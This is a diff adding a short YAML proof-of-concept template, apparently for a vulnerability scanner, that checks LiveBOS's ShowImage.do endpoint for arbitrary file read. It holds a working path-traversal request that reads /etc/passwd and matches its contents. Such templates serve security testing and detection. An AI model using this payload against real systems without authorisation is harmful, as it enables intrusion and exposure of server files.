@@ -1,0 +1,15 @@
+id: poc-yaml-livebos-arbitrary-file-read
+info:
+  name: LiveBOS-ShowImage.do-任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: LiveBos
+requests:
+- method: GET
+  path: /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
